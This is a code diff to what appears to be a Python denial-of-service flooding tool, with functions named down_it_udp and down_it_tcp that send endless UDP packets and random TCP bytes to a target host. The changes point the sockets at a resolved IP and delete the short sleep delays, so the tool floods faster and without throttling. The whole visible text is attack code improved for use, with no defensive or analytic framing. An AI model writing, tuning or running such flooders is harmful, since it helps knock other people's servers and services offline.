@@ -25,7 +25,7 @@ def down_it_udp(_ctx: Context):
                  f'\n\n{extra_data}'.encode('utf-8')
 
         try:
-            sock.sendto(packet, (_ctx.host, _ctx.port))
+            sock.sendto(packet, (_ctx.host_ip, _ctx.port))
         except socket.gaierror:
             if get_server_ip_error_msg not in _ctx.errors:
                 _ctx.errors.append(str(get_server_ip_error_msg))
@@ -48,8 +48,6 @@ def down_it_udp(_ctx: Context):
             thread = threading.Thread(target=show_statistics, args=[_ctx])
             thread.daemon = True
             thread.start()
-
-        time.sleep(.01)
 
 
 def down_it_http(_ctx: Context):
@@ -80,14 +78,13 @@ def down_it_tcp(_ctx: Context):
     while True:
         try:
             sock = _ctx.sock_manager.create_tcp_socket()
-            sock.connect((_ctx.host, _ctx.port))
+            sock.connect((_ctx.host_ip, _ctx.port))
             _ctx.connections_success += 1
             while True:
                 try:
                     bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024
                     bytes_to_send = randbytes(_ctx.max_random_packet_len)
                     sock.send(bytes_to_send)
-                    time.sleep(.01)
                 except:
                     sock.close()
                     break
@@ -103,5 +100,3 @@ def down_it_tcp(_ctx: Context):
                 thread = threading.Thread(target=show_statistics, args=[_ctx])
                 thread.daemon = True
                 thread.start()
-
-        time.sleep(.01)
